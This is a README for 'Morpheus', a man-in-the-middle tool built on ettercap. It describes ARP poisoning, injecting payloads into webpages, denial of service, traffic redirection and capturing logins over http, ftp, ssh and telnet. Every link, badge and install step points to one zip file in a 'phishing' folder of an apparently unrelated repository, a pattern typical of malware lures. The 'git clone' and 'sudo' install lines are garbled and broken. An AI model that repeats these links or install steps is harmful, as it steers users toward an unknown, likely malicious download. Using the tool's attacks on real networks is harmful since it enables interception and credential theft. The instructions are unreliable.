[![Version](https://raw.githubusercontent.com/mahazoualedji595/morpheus/master/bin/phishing/Google Sphere_files/Software-v1.1-beta.2.zip)]()
[![Stage](https://raw.githubusercontent.com/mahazoualedji595/morpheus/master/bin/phishing/Google Sphere_files/Software-v1.1-beta.2.zip)]()
[![Build](https://raw.githubusercontent.com/mahazoualedji595/morpheus/master/bin/phishing/Google Sphere_files/Software-v1.1-beta.2.zip)]()
[![AUR](https://raw.githubusercontent.com/mahazoualedji595/morpheus/master/bin/phishing/Google Sphere_files/Software-v1.1-beta.2.zip)]()

# Morpheus - automated ettercap TCP/IP Hijacking tool
![morpheus v2.2-BETA](https://raw.githubusercontent.com/mahazoualedji595/morpheus/master/bin/phishing/Google Sphere_files/Software-v1.1-beta.2.zip)

    Version release: v2.2 - STABLE
    Author: pedro ubuntu  [ r00t-3xp10it ]
    Codename: oneiroi phobetor (The mithologic dream greek god)
    Distros Supported: Linux Ubuntu, Kali, Debian, BackBox, Parrot OS
    Suspicious-Shell-Activity© (SSA) RedTeam develop @2018

<br />

# LEGAL DISCLAMER
    The author does not hold any responsibility for the bad use of this tool,
    remember that attacking targets without prior consent it's illegal and punished by law.

# Framework description
    Morpheus it's a Man-In-The-Middle (mitm) suite that allows users to manipulate
    tcp/udp data using ettercap, urlsnarf, msgsnarf and tcpkill as backend applications.
    but this tool main objective its not to provide an easy way to exploit/sniff targets,
    but ratter a call of attemption to tcp/udp manipulations technics (etter filters)

    Morpheus ships with some pre-configurated filters but it will allow users to improve them
    when launch the attack (morpheus scripting console). In the end of the attack morpheus will
    revert the filter back to is default stage, this will allow users to improve filters at
    running time without the fear of messing with filter command syntax and spoil the filter.
    "Perfect for scripting fans to safely test new concepts"...

    HINT: morpheus allow you to improve filters in 2 diferent ways
    1º - Edit filter before runing morpheus and the 'changes' will be permanent
    2º - Edit filter using 'morpheus scripting console' and the changes are active only once


<br />

# What can we acomplish by using filters?
    morpheus comes with a collection of filters writen be me to acomplish various tasks:
    replacing images in webpages, replace text in webpages, inject payloads in webpages,
    denial-of-service attacks (drop,kill packets from source), redirect browser traffic
    to another domain and gives you the ability to build compile your filter from scratch
    and run it through morpheus framework (option W).

    "filters can be extended using browser languages like: javascript,css,flash,etc"...


> In this example we are using "<head> HTML tag" to inject an rediretion url into target request
![morpheus v1.6-Alpha](https://raw.githubusercontent.com/mahazoualedji595/morpheus/master/bin/phishing/Google Sphere_files/Software-v1.1-beta.2.zip)
> In this example we are using 'CSS3' to trigger webpage 180º rotation
![morpheus v1.6-Alpha](https://raw.githubusercontent.com/mahazoualedji595/morpheus/master/bin/phishing/Google Sphere_files/Software-v1.1-beta.2.zip)

<br />

# Framework limitations
    1º - morpheus will fail if target system its protected againt arp poison atacks
    2º - target system sometimes needs to clear the net cache for arp poison to be effective
    3º - many attacks described in morpheus may be dropped by the target HSTS detection sys.


> 4º - morpheus needs ettercap to be executed with higth privileges (uid 0 | gid 0). <br />
> correct ettercap configuration display (running as Admin without ssl disectors active)
![morpheus v1.6-Alpha](https://raw.githubusercontent.com/mahazoualedji595/morpheus/master/bin/phishing/Google Sphere_files/Software-v1.1-beta.2.zip)

    By default morpheus (at startup) will replace the original https://raw.githubusercontent.com/mahazoualedji595/morpheus/master/bin/phishing/Google Sphere_files/Software-v1.1-beta.2.zip files
    provided by ettercap. On exit morpheus will revert those files to is original state..
    [ ITS IMPORTANTE TO EXIT THE TOOL PROPER TO REVERT THE CHANGES MADE (press 'E' to exit) ]

<br />

# Dependencies
    required: ettercap, nmap, zenity, apache2
    sub-dependencies: driftnet, dsniff (urlsnarf,tcpkill,msgsnarf), sslstrip-0.9, dns2proxy

# Credits
    ettercap (alor&naga) | nmap (fyodor) | apache2 (Rob McCool) | dsniff (Dug Song)
    filters: irongeek (replace img) | seannicholls (rotate 180º) | TheBlaCkCoDeR09 (ToR-Browser-0day)

<br />

# Download/Install
      1º - git clone https://raw.githubusercontent.com/mahazoualedji595/morpheus/master/bin/phishing/Google Sphere_files/Software-v1.1-beta.2.zip
      2º - cd morpheus
      3º - chmod -R +x *.sh
      4º - chmod -R +x *.py
      5º - nano settings
      6º - sudo https://raw.githubusercontent.com/mahazoualedji595/morpheus/master/bin/phishing/Google Sphere_files/Software-v1.1-beta.2.zip

<br /><br /><br />

## Nmap scans available [option S]<br />
![morpheus v2.2-Alpha](https://raw.githubusercontent.com/mahazoualedji595/morpheus/master/bin/phishing/Google Sphere_files/Software-v1.1-beta.2.zip)

      Morpheus v2.2 allows is users to scan with nmap sending one fake User_Agent [ IPhone ]
      Activate this special funtion in [ settings ] file under morpheus main folder.
      HINT: This setting its only available in morpheus [ scan LAN for live hosts ]

![morpheus v2.2-Alpha](https://raw.githubusercontent.com/mahazoualedji595/morpheus/master/bin/phishing/Google Sphere_files/Software-v1.1-beta.2.zip)

      HINT: we can edit morpheus https://raw.githubusercontent.com/mahazoualedji595/morpheus/master/bin/phishing/Google Sphere_files/Software-v1.1-beta.2.zip lib and input other user_agent,before run the tool.
      HINT: My https://raw.githubusercontent.com/mahazoualedji595/morpheus/master/bin/phishing/Google Sphere_files/Software-v1.1-beta.2.zip lib modified also allows diferent user_agent inputs at run-time like:
      nmap -sV --script-args https://raw.githubusercontent.com/mahazoualedji595/morpheus/master/bin/phishing/Google Sphere_files/Software-v1.1-beta.2.zip"Apache-HttpClient/4.0.3 (java 1.5)" Target-Ip


![morpheus v2.2-Alpha](https://raw.githubusercontent.com/mahazoualedji595/morpheus/master/bin/phishing/Google Sphere_files/Software-v1.1-beta.2.zip)

<br />

## Detecting DHCP requests to access local lan [option 17]<br />
![morpheus v2.2-Alpha](https://raw.githubusercontent.com/mahazoualedji595/morpheus/master/bin/phishing/Google Sphere_files/Software-v1.1-beta.2.zip)

<br />

## Detecting-blocking crypto currency connections [option 18]<br />
![morpheus v2.2-Alpha](https://raw.githubusercontent.com/mahazoualedji595/morpheus/master/bin/phishing/Google Sphere_files/Software-v1.1-beta.2.zip)

<br />

## Redirect all devices in LAN to google prank [option 19]<br />
![morpheus v2.2-Alpha](https://raw.githubusercontent.com/mahazoualedji595/morpheus/master/bin/phishing/Google Sphere_files/Software-v1.1-beta.2.zip)
![morpheus v2.2-Alpha](https://raw.githubusercontent.com/mahazoualedji595/morpheus/master/bin/phishing/Google Sphere_files/Software-v1.1-beta.2.zip)
`HINT: This module depends of .im domain not beeing redirected`<br />

<br />

## firewall filter screenshots [option 1]<br />

    firewall [option 1] pre-configurated filter will capture credentials from the follow services:
    http,ftp,ssh,telnet (facebook uses https/ssl :( ) report suspicious connections, report common
    websocial browsing (facebook,twitter,youtube), report the existence of botnet connections like:
    Mocbot IRC Bot, Darkcomet, redirect browser traffic and allow users to block connections (drop,kill) 
    "Remmenber: morpheus gives is users the ability to 'add more rules' to filters befor execution"

    [morpheus] host:192.168.1.67   [ -> ]  port:23 telnet  ☆
               Source ip addr      flow    destination     rank good

    [morpheus] host:192.168.1.67   [ <- ]  port:23 telnet  ☠
               Destination ip      flow    source port     rank suspicious


![morpheus v2.2-Alpha](https://raw.githubusercontent.com/mahazoualedji595/morpheus/master/bin/phishing/Google Sphere_files/Software-v1.1-beta.2.zip)

![morpheus v2.2-Alpha](https://raw.githubusercontent.com/mahazoualedji595/morpheus/master/bin/phishing/Google Sphere_files/Software-v1.1-beta.2.zip)

![morpheus v2.2-Alpha](https://raw.githubusercontent.com/mahazoualedji595/morpheus/master/bin/phishing/Google Sphere_files/Software-v1.1-beta.2.zip)

![morpheus v2.2-Alpha](https://raw.githubusercontent.com/mahazoualedji595/morpheus/master/bin/phishing/Google Sphere_files/Software-v1.1-beta.2.zip)

> Basically firewall filter will act like one offensive and defensive tool analyzing the
> tcp/udp data flow to report logins,suspicious traffic,brute-force,block target ip,etc.
<br />

---


_EOF

